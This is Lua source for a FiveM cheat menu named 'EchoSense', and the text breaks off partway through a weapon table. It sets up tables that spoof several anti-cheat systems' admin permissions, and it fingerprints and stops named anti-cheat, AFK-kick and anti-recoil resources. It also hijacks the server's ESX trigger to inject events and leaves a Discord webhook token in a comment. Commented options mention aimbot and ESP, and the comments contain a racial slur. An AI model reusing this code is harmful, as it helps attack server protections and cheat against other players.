BLOWMYDICK = TriggerServerEvent

--ChocoHax BYPASS--
MyricaS = {}
MyricaS.Bypass = {"chocohaxadministrator", "chocohaxmoderator", false}
MyricaS.AdminMenu = {"chocohaxadministrator", false}
MyricaS.Spectate = {"chocohaxadministrator", "chocohaxmoderator", false}
MyricaS.Blips = {"chocohaxadministrator", "chocohaxmoderator", "chocohaxjobs", false}

--Banned AntiSHIT --

--JK AntiShit--
JkAntiShit = {} 
JkAntiShit.bypassIdentifiers = {"discord:594622237407969285", "discord:215880394594189313", false}
JkAntiShit.adminIdentifiers = {"discord:594622237407969285", "discord:215880394594189313", false}
-- Cryzysek 215880394594189313

-- LR-AC Bypass --
LRAC = {}
LRAC.Bypass = {"lracadmin","lracmod", false} --GODMODE,BLIPS,BLACKLISTEDCMDS,SPEEDHACK
LRAC.OpenMenuAllowed = {"lracadmin", false}
LRAC.SpectateAllowed = {"lracadmin","lracmod", false}
LRAC.ClearAreaAllowed = {"lracadmin", false}
-- LR-AC Bypass --

-- Lynx-AC Bypass --
LXC = {}
LXC.Bypass = {"lcacadmin","lcacmod", false} --GODMODE,BLIPS,BLACKLISTEDCMDS,SPEEDHACK
LXC.OpenMenuAllowed = {"lcacadmin", false}
LXC.SpectateAllowed = {"lcacadmin","lcacmod", false}
LXC.ClearAreaAllowed = {"lcacadmin", false}
LXC.BlipsAllowed = {"lcacadmin","lcacmod","lcacpolice", false} -- ADDED LCAC POLICE BYPASS
-- Lynx-AC Bypass --

-- DFW24K Pokus --
DFW24HOVNO = {}
DFW24HOVNO.AdminsSteam = {}
-- Tam vlozime nase steamy !! Pouze identifikatory !! steam:11111111111111

--VanillaAC BYPASS-- / LittleAC / THIS NIGGA IS STILL CHANGING THE NAME LOL
LuciF = {}
LuciF.Bypass = {"VanillaACGBadmin", false} -- Godmode,Invisible,Spectate,and Blips
LuciF.SpectateAllowed = {"VanillaACGBadmin","VanillaACGBmod", false} --Permission Spectate mode
LuciF.BlipsAllowed = {"VanillaACGBadmin", "VanillaACGBmod", "VanillaACGBpolice", false} --Permission Blips

JofH = {}
JofH.SpectateAllowed = {"VanillaACGBadmin","VanillaACGBmod"} --Permission Spectate mode
JofH.BlipsAllowed = {"VanillaACGBadmin", "VanillaACGBmod", "VanillaACGBpolice"} --Permission Blips

LittleAC = {}
LittleAC.Bypass = {"LittleACGBadmin","LittleACGBmod","LittleACGBpolice", false} --Godmode, Blipy, ZmeneneTriggery, Speedhack, BlacklistedCmds...
LittleAC.OpenMenuAllowed = {"LittleACGBadmin", false}
LittleAC.SpectateAllowed = {"LittleACGBadmin","LittleACGBmod", false}
LittleAC.ClearAreaAllowed = {"LittleACGBadmin", false}
LittleAC.BlipsAllowed = {"LittleACGBadmin", "LittleACGBmod", "LittleACGBpolice", false} --Povolení blipů


local CreateThread = Citizen.CreateThread
local CreateThreadNow = Citizen.CreateThreadNow
SelectSkin = 1

local contributors = {
	{'<font color="#D800FF">cryzysek~w~#3530', '~w~<font color="#2580E1">UI~w~, </font> <font color="#4280C6">Code ~w~& ~y~Functions</font>'},
}


-- takytemamrad Functions Funkce cigane
---------------------------------------------------------------------------------------
local takytemamrad = {}
local Cya = {}
local was_other_invis = {}
local Rage = true
local Klidny = false
local allPlayersIncludeSelf = true
local ECHO_START = true
local isMenuEnabled = true
local playerBlips = false
local Enable_ESP = true

function Cya:CheckName(str) 
	if string.len(str) > 16 then
		fmt = string.sub(str, 1, 16)
		return tostring(fmt .. "...")
	else
		return str
	end
end
	local txd = CreateRuntimeTxd('meows') 
	local duiObj = CreateDui('https://i.imgur.com/8AJ50Re.gif', 400, 100) -- https://imgur.com/8giJMPr.png , https://media.discordapp.net/attachments/722961084931375104/749061558046294126/echosenselael.png , https://imgur.com/8giJMPr.png https://i.imgur.com/VAOZu3d.gif
	local dui = GetDuiHandle(duiObj)
	local txn = CreateRuntimeTextureFromDuiHandle(txd, "woof", dui)
	local duiObj2 = CreateDui('https://i.imgur.com/UVnix2t.gif', 400, 100) -- https://imgur.com/8giJMPr.png , https://media.discordapp.net/attachments/722961084931375104/749061558046294126/echosenselael.png , https://imgur.com/8giJMPr.png https://i.imgur.com/VAOZu3d.gif
	local dui2 = GetDuiHandle(duiObj2)
	local txn2 = CreateRuntimeTextureFromDuiHandle(txd, "woof2", dui2)
	

    --[[ Rainbow Color Generator ]]
function GenerateRainbow(frequency)
        local result = {}
        local curtime = GetGameTimer() / 1000
        result.r = math.floor(math.sin(curtime * frequency + 0) * 127 + 128)
        result.g = math.floor(math.sin(curtime * frequency + 2) * 127 + 128)
        result.b = math.floor(math.sin(curtime * frequency + 4) * 127 + 128)
        return result
end

function GenerateRainbowLight(frequency)
	local result = {}
	local curtime = GetGameTimer() / 1000
	result.r = math.floor(math.sin(curtime * frequency + 0) * 67 + 168)
	result.g = math.floor(math.sin(curtime * frequency + 2) * 67 + 168)
	result.b = math.floor(math.sin(curtime * frequency + 4) * 67 + 168)
	return result
end

local barva = {}
local barvaLight = {}

Citizen.CreateThread(function()
	while true do
		Citizen.Wait(0)
		if Rage == false then
			barva = GenerateRainbow(1.0)
		elseif Rage then 
			barva = GenerateRainbow(1.0)
		end
		if isMenuEnabled == true then
			SetTextFont(4)
			SetTextScale(0.4, 0.4)
			SetTextColour(255, 255, 255, 255)
			SetTextEntry("STRING")
			AddTextComponentString("ECHO~g~SENSE~s~")
			DrawText(0.0025,0.0012)
			DrawRect(150,100,3.2,0.008,barva.r,barva.g,barva.b,255)
			SetTextFont(4)
			SetTextScale(0.4, 0.4)
			SetTextColour(255, 255, 255, 255)
			SetTextEntry("STRING")
			AddTextComponentString("FiveMock")
			DrawText(0.0012,0.976)
			DrawRect(150,100,3.2,0.008,barva.r,barva.g,barva.b,255)
		end
	end
end)

function debugprint(text)
	print("[ECHO] "..text)
end

function round(num, numDecimalPlaces)
    local mult = 10 ^ (numDecimalPlaces or 0)
    return math.floor(num * mult + 0.5) / mult
end

TriggerCustomEvent=function(is_server,event,...)
	local args=msgpack.pack({...})
	if is_server then 
		TriggerServerEventInternal(event,args,args:len())
	else
		TriggerEventInternal(event,args,args:len())
	end
end

function DrawTxt(text, x, y, scale, size)
    SetTextFont(0)
    SetTextProportional(1)
    SetTextScale(scale, size)
    SetTextDropshadow(1, 0, 0, 0, 255)
    SetTextEdge(1, 0, 0, 0, 255)
    SetTextDropShadow()
    SetTextOutline()
    SetTextEntry("STRING")
    AddTextComponentString(text)
    DrawText(x, y)
end

--[[ DiscordWebHook Logger
EchoSense {}
EchoSense.DiscordWebhook = "https://discordapp.com/api/webhooks/753347010752413788/JPjpB1vfHA_9tuuNg_JKyJ3K1c9odLSNmlSTzjX97XOVddpOqF1A8wIUCUaod9KR9gJ9"
PerformHttpRequest(EchoSense.DiscordWebhook, function(err, text, headers) end, 'POST') Dodelam nekdy lel
]]

debugprint('IP: '..GetCurrentServerEndpoint())
debugprint('Executed in: '..GetCurrentResourceName())
debugprint('Searching for an AntiCheat')
local MenuOpen = false

local LOAD_es_extended = LoadResourceFile("es_extended", "client/common.lua")
if LOAD_es_extended then
	LOAD_es_extended = LOAD_es_extended:gsub("AddEventHandler", "")
	LOAD_es_extended = LOAD_es_extended:gsub("cb", "")
	LOAD_es_extended = LOAD_es_extended:gsub("function ", "")
	LOAD_es_extended = LOAD_es_extended:gsub("return ESX", "")
	LOAD_es_extended = LOAD_es_extended:gsub("(ESX)", "")
	LOAD_es_extended = LOAD_es_extended:gsub("function", "")
	LOAD_es_extended = LOAD_es_extended:gsub("getSharedObject%(%)", "")
	LOAD_es_extended = LOAD_es_extended:gsub("end", "")
	LOAD_es_extended = LOAD_es_extended:gsub("%(", "")
	LOAD_es_extended = LOAD_es_extended:gsub("%)", "")
	LOAD_es_extended = LOAD_es_extended:gsub(",", "")
	LOAD_es_extended = LOAD_es_extended:gsub("\n", "")
	LOAD_es_extended = LOAD_es_extended:gsub("'", "")
	LOAD_es_extended = LOAD_es_extended:gsub("%s+", "")
	if tostring(LOAD_es_extended) ~= 'esx:getSharedObject' then
		debugprint('This server is using trigger replacement!')
	end
end

ESX = nil

Citizen.CreateThread(function()

	if ESX == nil then

		TriggerEvent(tostring(LOAD_es_extended), function(obj) ESX = obj end)

		Citizen.Wait(0)
			debugprint("ESX: "..tostring(LOAD_es_extended))
		Citizen.Wait(1000)
	end
end)
	
local function wait(self)
	local rets = Citizen.Await(Cya.Player.p)
	if not rets then
		if Cya.Player.r then
			rets = Cya.Player.r
		else
			error("^1ERROR : async->wait() = nil | contact leuit#0100")
		end
	end

	return table.unpack(rets, 1, table.maxn(rets))
end
  
local function areturn(self, ...)
	Cya.Player.r = {...}
	Cya.Player.p:resolve(Cya.Player.r)
end
 
--local function MoneyExploit(resource)
	--fm.print(resource)
--end
--[[Citizen.CreateThread(function()
	if ECHO_START then
		function StopResource(resource)
			fm.stopres(resource)
		end
		local AntiCheat =
			fm.findres(
			false, -- 0
			"LCAC 8 config", --1
			"anticheese:timer", --2
			"TigoAntiCheat", --3
			"disableallweapons", --4
			"AntiCheatStatus", --5
			"TESTAR DANO DA SHOTGUN", --6
			"key='Godzilla'", --7
			"speed (set to 0.0 to disable)", --8
			"Detection si le joueurs est dans un v_Ehicule de police", --9
			"Detection si le joueurs est dans un v_Ehicule de police", --10
			"${FM_CHOCOHAX1}",--11
			"${FM_CHOCOHAX2}", -- 12
			"--0NIXAC BYPASS--", --13
			"KEYS BLOCKING OPTIONS", --14
			"--LITTLEAC BYPASS--", --15
			"ADJksjljclkjlwelw:OISOFD032092", --16
			"UwU5674656465dGKODKELKOIOISLsdoiopdpfpQPWWoferldkcjaqsujAIKJWLFCNVBCDXewqFSK664xI0938204JLSKJLASFD", --17
			"\116\80\97\112", --18
			"\116\85\76\57\34\41\59", --19
			"ple$:X", --20
			"ayzn:ban", --21
			"WaveShield:clearVehicles", --22
			"WaveShield:clearPeds", --23
			"NVXTTHB915", --24 
			"carblacklist", --25
			"LittleACGBadmin", --26
			"esx:getSharedObject2", --27
			--"HCheat:TempDisableDetection", --28
			--"HCheat", -- 29
			"LuciF", -- 30
			"--VanillaAC BYPASS--", -- 31
			"21I18275181D27621W23H22Z22P2", --32
			"[25] = true", -- 33
			--"EnableChecking(enable, isDev)", ---34
			"LuciF.Bypass", -- 35
			"\88\70\85\53\75\52\55\48\82\32\49\53\32\52\87\51\53\48\77\51\46\32\75\82\51\68\49\55\32\55\48\32\88\70\85\53\75\52\55\48\82\33", -- 36
			"JofH", -- 37
			"VanillaACGBadmin", -- 38
			"JofH.Bypass", -- 39
			"local function Qs1lr0HrTHnFVX2oi(tjrqw3MaqXHxANXUGD)", --40
			"blackWeps", -- 41	
			"VpT9YlOQR1pCcESMqoN2", --42
			"yfx5LAJZQwG83WVZ", -- 43
			"waveshieldbetterthanyounoob", -- 44
			"kakuhsdubhzuhbudzdz", -- 45
			"PSU|26Y12121027727810" -- 46

		)
		if #AntiCheat == 0 then
			print("[ECHO-AC]No AntiCheat Detected :(")
		end
		for i = 1, #AntiCheat do
			local anti_cheat = AntiCheat[i]
			local anti_cheat_resource = anti_cheat.n
			if anti_cheat.i == 1 then
				print("[ECHO-AC]Disabling LCAC...")
				StopResource(anti_cheat_resource)
			elseif anti_cheat.i == 2 then
				print("[ECHO-AC]Disabling AntiCheese...")
				StopResource(anti_cheat_resource)
			elseif anti_cheat.i == 3 then
				print("[ECHO-AC]Disabling TigoAntiCheat...")
				StopResource(anti_cheat_resource)
			elseif anti_cheat.i == 4 or anti_cheat.i == 25 or anti_cheat.i == 41 then
				print("[ECHO-AC]Disabling Blacklister...")
				StopResource(anti_cheat_resource)
			elseif anti_cheat.i == 5 then
				print("[ECHO-AC]Disabling Anti-ESX...")
				StopResource(anti_cheat_resource)
			elseif anti_cheat.i == 6 then
				print("[ECHO-AC]Unspefied AntiCheat Detected... Disabling")
				StopResource(anti_cheat_resource)
			elseif anti_cheat.i == 7 or anti_cheat.i == 14 then
				print("[ECHO-AC]Disabling Godzilla AntiShit...")
				StopResource(anti_cheat_resource)
			elseif anti_cheat.i == 8 then
				print("[ECHO-AC]Unspefied AntiCheat Detected... Disabling")
				StopResource(anti_cheat_resource)
			elseif anti_cheat.i == 9 then
				print("[ECHO-AC]Disabling Ruby AntiShit...")
				StopResource(anti_cheat_resource)
			elseif anti_cheat.i == 10 then
				print("[ECHO-AC]Disabling xChiken AntiShit...")
				StopResource(anti_cheat_resource)
			elseif anti_cheat.i == 11 or anti_cheat.i == 12 or anti_cheat.i == 33 or anti_cheat.i == 36 or anti_cheat.i == 40 then
				print("[ECHO-AC]Disabling ChocoHax...")
				StopResource(anti_cheat_resource)
			elseif anti_cheat.i == 12 then
				print("[ECHO-AC]Disabling LR-AC...")
				StopResource(anti_cheat_resource)
			elseif anti_cheat.i == 13 or anti_cheat.i == 15 then
				print("[ECHO-AC]Disabling LittleAC...")
				StopResource(anti_cheat_resource)
			elseif anti_cheat.i == 16  or anti_cheat.i == 17 or anti_cheat.i == 26 then
				print("[ECHO-AC]Disabling DFW24K Reloaded...")
				StopResource(anti_cheat_resource)
			elseif anti_cheat.i == 18 or anti_cheat.i == 19 then
				print("[ECHO-AC]Disabling DFW24K...")
				StopResource(anti_cheat_resource)
			elseif anti_cheat.i == 20 then
				print("[ECHO-AC]Disabling Underground Romania AC...")
				StopResource(anti_cheat_resource)
			elseif anti_cheat.i == 21 then
				print("[ECHO-AC]Disabling StarLife-AC...")
				StopResource(anti_cheat_resource)
			elseif anti_cheat.i == 22 or anti_cheat.i == 23 or anti_cheat.i == 44 or anti_cheat.i == 45 then
				print("[ECHO-AC]Disabling WaveShield...")
				StopResource(anti_cheat_resource)
			elseif anti_cheat.i == 24 then
				print("[ECHO-AC]Disabling RFLX-AC...")
				StopResource(anti_cheat_resource)
			elseif anti_cheat.i == 27 then
				print("[ECHO-AC]Disabling SWRP-AC...")
				StopResource(anti_cheat_resource)
			--elseif anti_cheat.i == 28 or anti_cheat.i == 29 or anti_cheat.i == 34 then
				--print("[ECHO-AC]Disabling HighLife-AC...")
				--StopResource(anti_cheat_resource)
			elseif anti_cheat.i == 30 or anti_cheat.i == 31 or anti_cheat.i == 32 or anti_cheat.i == 35 or anti_cheat.i == 37 or anti_cheat.i == 38 or anti_cheat.i == 39 then
				print("[ECHO-AC]Disabling VanillaAC...")
				StopResource(anti_cheat_resource)
			elseif anti_cheat.i == 42 or anti_cheat.i == 43 then
				print("[ECHO-AC]Disabling LARP-AC...")
				StopResource(anti_cheat_resource)
			elseif anti_cheat.i == 46 then
				print("[ECHO-AC]Disabling Tiron-AC...")
				StopResource(anti_cheat_resource)
			end
		end
		ECHO_START = false
	end
end)

-- Jestli tu budes neco delat tak nedavej pod #AntiCokoliv return jinak se nespusti menu Ale to ty vis asi :D
-- Anti AFK Kick Proste bypass funkce
		function Vypinacka(resource)
			fm.stopres(resource)
		end

		local bypassfunc =
		fm.findres(
			false, -- 0
			"afkkick:kickplayer", --1
			"kickForBeingAnAFKDouchebag", --2
			"checkMyPingBro", --3
			"es_admin:freezePlayer", --4
			"recoils[wep]", --5
			"bluethefurry", --6
			"HideHudComponentThisFrame(14)", --7
			"txAdminClient:warn" -- 8
		)
		if #bypassfunc == 0 then
			debugprint("Nothing to bypass")
		end
		for i = 1, #bypassfunc do
			local bypass_func = bypassfunc[i]
			local bypass_func_resource = bypass_func.n
			if bypass_func.i == 1 or bypass_func.i == 2 then
				--debugprint("Anti-AFK Kick Enabled...")
				Vypinacka(bypass_func_resource)
			elseif bypass_func.i == 3 then
				--debugprint("Anti-Ping Kick Enabled...")
				Vypinacka(bypass_func_resource)
			--elseif bypass_func.i == 4 then
				--debugprint("Disabling es_admin")
				--Vypinacka(bypass_func_resource)
			elseif bypass_func.i == 5 or bypass_func.i == 6 then
				--debugprint("Disabling Recoil script...")
				Vypinacka(bypass_func_resource)
			elseif bypass_func.i == 7 then
				--debugprint("Disabling Anti-Crosshair...")
				Vypinacka(bypass_func_resource)
			--elseif bypass_func.i == 8 then
				--debugprint("Disabling txAdmin...")
				--Vypinacka(bypass_func_resource)
			end
		end


		--[[function Vypinacka(resource)
			fm.stopres(resource)
		end

		"anticheese",
        "anticheat",
        "antilynx",
        "discordbot",
        "EasyAdmin:CaptureScreenshot",
        "screenshot",
        "cheat",
        "ncpp",
        "ViolationDetected",
        "godModePass",
        "godModeFail",
        "adminGodmodeCheck",
        "illegalWeapon",
        "ybn_ac",
        "x_anticheat",
        "CMG:ban",
        "Choco:",
        "alpha-tango-golf",
        "AC_SYNC:BAN",
        "foundyou",
        "AntiBlips",
        "AntiSpectate",
        "CarlosLR-AC",
        "globalAC:trigger",
        "NWAC",
        "AC:Sanction",
        "ChXa"]]
--[[local moneytriggers =
fm.findres(
	false, 
	"BLOWMYDICK",
	"TriggerEvent",
	"TriggerClient"
)
if #moneytriggers == 0 then
    debugprint("This server is not using any triggers")
end
for i = 1, #moneytriggers do
    local money_triggers = money_triggers[i]
    local money_triggers_resource = bypass_func.n
    if money_triggers.i == 1 then
        debugprint("Printing all TriggerServerEvents...")
		MoneyExploit(money_triggers_resource)
	elseif money_triggers.i == 2 then
			debugprint("Printing all TriggerEvents...")
			MoneyExploit(money_triggers_resource)	
			MoneyExploit(money_triggers_resource)
	elseif money_triggers.i == 2 then
			debugprint("Printing all TriggerClientEvents...")
			MoneyExploit(money_triggers_resource)						
    end
end
--]]


-- create an async returner or a thread (Citizen.CreateThreadNow)
-- func: if passed, will create a thread, otherwise will return an async returner
function takytemamrad.Async(func)
	if func then
		Citizen.CreateThreadNow(func)
	else
		return setmetatable({ wait = wait, p = promise.new() }, { __call = areturn })
	end
end

takytemamrad.Math = {}

takytemamrad.Math.Round = function(value, numDecimalPlaces)
	return tonumber(string.format("%." .. (numDecimalPlaces or 0) .. "f", value))
end

takytemamrad.Math.GroupDigits = function(value)
	local left,num,right = string.match(value,'^([^%d]*%d)(%d*)(.-)$')

	return left..(num:reverse():gsub('(%d%d%d)','%1' .. _U('locale_digit_grouping_symbol')):reverse())..right
end

takytemamrad.Math.Trim = function(value)
	if value then
		return (string.gsub(value, "^%s*(.-)%s*$", "%1"))
	else
		return nil
	end
end


--[[  Tables
local CKG = {
	DynamicTriggers = {},
	Painter = {},
	Util = {},
	Categories = {},
	List = {},
	PlayerCache = {},
	Config = {
		Vehicle = {
			Boost = 1.0
		},
		Player = {
			CrossHair = false,
			Blips = true,
			ESP = true,
			ESPDistance = 1000.0,
			Box = false,
			Bone = false,
			OneTap = false,
			Aimbot = false,
			AimbotNeedsLOS = true,
			TriggerBotNeedsLOS = true,
			TPAimbot = false,
			TPAimbotThreshold = 40.0,
			TPAimbotDistance = 2.0,
			RageBot = false,
			TriggerBot = false,
			NoDrop = false,
			AimbotFOV = 90.0,
			AimbotBone = 1,
			AimbotKey = "MOUSE1",
			AimbotReleaseKey = "LEFTALT",
			TriggerBotDistance = 500.0,
			TargetInsideVehicles = false
		},
		UseBackgroundImage = true,
		UseSounds = true,
		UseAutoWalk = false,
		UseAutoWalkAlt = false,
		ShowKey = "TAB",
		FreeCamKey = "HOME",
		RCCamKey = "=",
		DisableKey = "-",
		ShowText = true,
		SafeMode = true,
		MenuX = 300,
		MenuY = 300,
		NotifX = nil,
		NotifY = nil,
		NotifW = 420,
		CurrentSelection = 1,
		SelectedCategory = "category_1",
		UsePrintMessages = false
	},
	Name = "Fallout Menu",
	Version = "1.2.2c",
	Enabled = true,
	Showing = false,
	Base64 = {},
	Tertiary = {255, 205, 0, 255},
	MenuW = 923,
	MenuH = 583,
	DraggingX = nil,
	DraggingY = nil,
	CurrentPlayer = nil
}]]



-- Cya.Player Table
Cya.Player = {
	Spectating = false,
	IsInVehicle = false,
	isNoclipping = false,
	Vehicle = 0,
}

-- Menu toggle table
Cya.Toggle = {
	RainbowVehicle = false,
	ReplaceVehicle = true,
	SpawnInVehicle = true,
	VehicleCollision = false,
	MagnetoMode = false,
	SelfRagdoll = false,
	EasyHandling = false,
	DeleteGun = false,
	RapidFire = false,
	ExplosiveAmmo = false,
	SilentExplosiveAmmo = false,
	VehicleNoFall = false,

}

Cya.Events = {
	Revive = {}
}

local WeaponAttachments = {
    Melee = {
        BaseballBat = {id = "weapon_bat", name = "Baseball Bat", bInfAmmo = false, mods = {}},
        BrokenBottle = {id = "weapon_bottle", name = "Broken Bottle", bInfAmmo = false, mods = {}},
        Crowbar = {id = "weapon_Crowbar", name = "Crowbar", bInfAmmo = false, mods = {}},
        Flashlight = {id = "weapon_flashlight", name = '<font color="#66666A">Flashlight', bInfAmmo = false, mods = {}},
        GolfClub = {id = "weapon_golfclub", name = "Golf Club", bInfAmmo = false, mods = {}},
        BrassKnuckles = {id = "weapon_knuckle", name = "Brass Knuckles", bInfAmmo = false, mods = {}},
        Knife = {id = "weapon_knife", name = "Knife", bInfAmmo = false, mods = {}},
        Machete = {id = "weapon_machete", name = "Machete", bInfAmmo = false, mods = {}},
        Switchblade = {id = "weapon_switchblade", name = "Switchblade", bInfAmmo = false, mods = {}},
        Nightstick = {id = "weapon_nightstick", name = "Nightstick", bInfAmmo = false, mods = {}},
        BattleAxe = {id = "weapon_battleaxe", name = "Battle Axe", bInfAmmo = false, mods = {}}
    },
    Handguns = {
        Pistol = {
            id = "weapon_pistol",
            name = "Pistol",
            bInfAmmo = false,
            mods = {
                Magazines = {
                    {name = '<font color="#66666A">Default Magazine', id = "COMPONENT_PISTOL_CLIP_01"},
                    {name = '<font color="#66666A">Extended Magazine', id = "COMPONENT_PISTOL_CLIP_02"}
                },
                Flashlight = {{name = '<font color="#66666A">Flashlight', id = "COMPONENT_AT_PI_FLSH"}},
				BarrelAttachments = {{name = '<font color="#66666A">Suppressor', id = "COMPONENT_AT_PI_SUPP_02"}},
				Luxury = {{name = '<font color="#66666A">Lux Skin', id = "COMPONENT_PISTOL_VARMOD_LUXE"}}
            }
        },
        PistolMK2 = {
            id = "weapon_pistol_mk2",
            name = "Pistol MK 2",
            bInfAmmo = false,
            mods = {
                Magazines = {
                    {name = '<font color="#66666A">Default Magazine', id = "COMPONENT_PISTOL_MK2_CLIP_01"},
                    {name = '<font color="#66666A">Extended Magazine', id = "COMPONENT_PISTOL_MK2_CLIP_02"},
                    {name = "Tracer Rounds", id = "COMPONENT_PISTOL_MK2_CLIP_TRACER"},
                    {name = "Incendiary Rounds", id = "COMPONENT_PISTOL_MK2_CLIP_INCENDIARY"},
                    {name = "Hollow Point Rounds", id = "COMPONENT_PISTOL_MK2_CLIP_HOLLOWPOINT"},
                    {name = "FMJ Rounds", id = "COMPONENT_PISTOL_MK2_CLIP_FMJ"}
                },
                Sights = {{name = "Mounted Scope", id = "COMPONENT_AT_PI_RAIL"}},
				Flashlight = {{name = '<font color="#66666A">Flashlight', id = "COMPONENT_AT_PI_FLSH_02"}},
                BarrelAttachments = {
                    {name = "Compensator", id = "COMPONENT_AT_PI_COMP"},
                    {name = "Suppessor", id = "COMPONENT_AT_PI_SUPP_02"}
                }
            }
        },
        CombatPistol = {
            id = "weapon_combatpistol",
            name = '<font color="#66666A">Combat Pistol',
            bInfAmmo = false,
            mods = {
                Magazines = {
                    {name = '<font color="#66666A">Default Magazine', id = "COMPONENT_COMBATPISTOL_CLIP_01"},
                    {name = '<font color="#66666A">Extended Magazine', id = "COMPONENT_COMBATPISTOL_CLIP_02"}
                },
                Flashlight = {{name = '<font color="#66666A">Flashlight', id = "COMPONENT_AT_PI_FLSH"}},
                BarrelAttachments = {{name = '<font color="#66666A">Suppressor', id = "COMPONENT_AT_PI_SUPP"}}
            }
        },
        APPistol = {
            id = "weapon_appistol",
            name = '<font color="#66666A">AP Pistol',
            bInfAmmo = false,
            mods = {
                Magazines = {
                    {name = '<font color="#66666A">Default Magazine', id = "COMPONENT_APPISTOL_CLIP_01"},
                    {name = '<font color="#66666A">Extended Magazine', id = "COMPONENT_APPISTOL_CLIP_02"}
                },
                Flashlight = {{name = '<font color="#66666A">Flashlight', id = "COMPONENT_AT_PI_FLSH"}},
				BarrelAttachments = {{name = '<font color="#66666A">Suppressor', id = "COMPONENT_AT_PI_SUPP"}},
				Luxury = {{name = '<font color="#66666A">Lux Skin', id = "COMPONENT_APPISTOL_VARMOD_LUXE"}}
            }
        },
        StunGun = {id = "weapon_stungun", name = "Stun Gun", bInfAmmo = false, mods = {}},
        Pistol50 = {
            id = "weapon_pistol50",
            name = "Pistol .50",
            bInfAmmo = false,
            mods = {
                Magazines = {
                    {name = '<font color="#66666A">Default Magazine', id = "COMPONENT_PISTOL50_CLIP_01"},
                    {name = '<font color="#66666A">Extended Magazine', id = "COMPONENT_PISTOL50_CLIP_02"}
                },
                Flashlight = {{name = '<font color="#66666A">Flashlight', id = "COMPONENT_AT_PI_FLSH"}},
				BarrelAttachments = {{name = '<font color="#66666A">Suppressor', id = "COMPONENT_AT_PI_SUPP_02"}},
				Luxury = {{name = '<font color="#66666A">Lux Skin', id = "COMPONENT_PISTOL50_VARMOD_LUXE"}}
            }
        },
        SNSPistol = {
            id = "weapon_snspistol",
            name = "SNS Pistol",
            bInfAmmo = false,
            mods = {
                Magazines = {
                    {name = '<font color="#66666A">Default Magazine', id = "COMPONENT_SNSPISTOL_CLIP_01"},
                    {name = '<font color="#66666A">Extended Magazine', id = "COMPONENT_SNSPISTOL_CLIP_02"}
                }
            }
        },
        SNSPistolMkII = {
            id = "weapon_snspistol_mk2",
            name = "SNS Pistol Mk II",
            bInfAmmo = false,
            mods = {
                Magazines = {
                    {name = '<font color="#66666A">Default Magazine', id = "COMPONENT_SNSPISTOL_MK2_CLIP_01"},
                    {name = '<font color="#66666A">Extended Magazine', id = "COMPONENT_SNSPISTOL_MK2_CLIP_02"},
                    {name = "Tracer Rounds", id = "COMPONENT_SNSPISTOL_MK2_CLIP_TRACER"},
                    {name = "Incendiary Rounds", id = "COMPONENT_SNSPISTOL_MK2_CLIP_INCENDIARY"},
                    {name = "Hollow Point Rounds", id = "COMPONENT_SNSPISTOL_MK2_CLIP_HOLLOWPOINT"},
                    {name = "FMJ Rounds", id = "COMPONENT_SNSPISTOL_MK2_CLIP_FMJ"}
                },
                Sights = {{name = "Mounted Scope", id = "COMPONENT_AT_PI_RAIL_02"}},
                Flashlight = {{name = '<font color="#66666A">Flashlight', id = "COMPONENT_AT_PI_FLSH_03"}},
                BarrelAttachments = {
                    {name = "Compensator", id = "COMPONENT_AT_PI_COMP_02"},
                    {name = '<font color="#66666A">Suppressor', id = "COMPONENT_AT_PI_SUPP_02"}
                }
            }
        },
        HeavyPistol = {
            id = "weapon_heavypistol",
            name = "Heavy Pistol",
            bInfAmmo = false,
            mods = {
                Magazines = {
                    {name = '<font color="#66666A">Default Magazine', id = "COMPONENT_HEAVYPISTOL_CLIP_01"},
                    {name = '<font color="#66666A">Extended Magazine', id = "COMPONENT_HEAVYPISTOL_CLIP_02"}
                },
                Flashlight = {{name = '<font color="#66666A">Flashlight', id = "COMPONENT_AT_PI_FLSH"}},
				BarrelAttachments = {{name = '<font color="#66666A">Suppressor', id = "COMPONENT_AT_PI_SUPP"}},
				Luxury = {{name = '<font color="#66666A">Lux Skin', id = "COMPONENT_HEAVYPISTOL_VARMOD_LUXE"}}
				
            }
        },
        VintagePistol = {
            id = "weapon_vintagepistol",
            name = "Vintage Pistol",
            bInfAmmo = false,
            mods = {
                Magazines = {
                    {name = '<font color="#66666A">Default Magazine', id = "COMPONENT_VINTAGEPISTOL_CLIP_01"},
                    {name = '<font color="#66666A">Extended Magazine', id = "COMPONENT_VINTAGEPISTOL_CLIP_02"}
                },
                BarrelAttachments = {{'<font color="#66666A">Suppressor', id = "COMPONENT_AT_PI_SUPP"}}
            }
        },
        FlareGun = {id = "weapon_flaregun", name = "Flare Gun", bInfAmmo = false, mods = {}},
        MarksmanPistol = {id = "weapon_marksmanpistol", name = "Marksman Pistol", bInfAmmo = false, mods = {}},
        HeavyRevolver = {id = "weapon_revolver", name = "Heavy Revolver", bInfAmmo = false, mods = {}},
        HeavyRevolverMkII = {
            id = "weapon_revolver_mk2",
            name = "Heavy Revolver Mk II",
            bInfAmmo = false,
            mods = {
                Magazines = {
                    {name = "Default Rounds", id = "COMPONENT_REVOLVER_MK2_CLIP_01"},
                    {name = "Tracer Rounds", id = "COMPONENT_REVOLVER_MK2_CLIP_TRACER"},
                    {name = "Incendiary Rounds", id = "COMPONENT_REVOLVER_MK2_CLIP_INCENDIARY"},
                    {name = "Hollow Point Rounds", id = "COMPONENT_REVOLVER_MK2_CLIP_HOLLOWPOINT"},
                    {name = "FMJ Rounds", id = "COMPONENT_REVOLVER_MK2_CLIP_FMJ"}
                },
                Sights = {
                    {name = "Holograhpic Sight", id = "COMPONENT_AT_SIGHTS"},
                    {name = "Small Scope", id = "COMPONENT_AT_SCOPE_MACRO_MK2"}
                },
                Flashlight = {{name = '<font color="#66666A">Flashlight', id = "COMPONENT_AT_PI_FLSH"}},
                BarrelAttachments = {{name = "Compensator", id = "COMPONENT_AT_PI_COMP_03"}}
            }
        },
        DoubleActionRevolver = {
            id = "weapon_doubleaction",
            name = "Double Action Revolver",
            bInfAmmo = false,
            mods = {}
        },
        UpnAtomizer = {id = "weapon_raypistol", name = "Up-n-Atomizer", bInfAmmo = false, mods = {}}
    },
    SMG = {
        MicroSMG = {
            id = "weapon_microsmg",
            name = "Micro SMG",
            bInfAmmo = false,
            mods = {
                Magazines = {
                    {name = '<font color="#66666A">Default Magazine', id = "COMPONENT_MICROSMG_CLIP_01"},
                    {name = '<font color="#66666A">Extended Magazine', id = "COMPONENT_MICROSMG_CLIP_02"}
                },
                Sights = {{name = '<font color="#66666A">Scope', id = "COMPONENT_AT_SCOPE_MACRO"}},
